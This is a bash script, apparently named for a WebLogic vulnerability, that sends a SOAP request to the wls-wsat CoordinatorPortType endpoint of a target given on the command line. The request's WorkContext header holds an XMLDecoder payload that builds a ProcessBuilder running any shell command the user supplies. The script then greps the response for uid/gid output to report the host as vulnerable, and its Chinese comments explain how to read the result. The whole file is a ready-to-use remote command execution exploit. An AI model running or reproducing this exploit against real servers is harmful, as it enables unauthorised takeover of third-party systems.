#!/usr/bin/env bash
TARGET="${1:?usage: bash wls2725.sh http://TARGET:7001}"
CMD="${2:-id}"
BODY='<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/sh</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>'"$CMD"'</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'
curl -sS -m 15 -X POST "${TARGET%/}/wls-wsat/CoordinatorPortType" \
  -H 'Content-Type: text/xml' --data "$BODY" -o runs/wls2725.txt -w 'http=%{http_code}\n'
head -20 runs/wls2725.txt
grep -qE 'uid=[0-9]+|gid=[0-9]+' runs/wls2725.txt && echo "VULN  $TARGET" || echo "SAFE/未命中（404 = 组件未部署或已修复）"
# 判定：响应体里出现 uid= / 命令输出；404 = 未部署
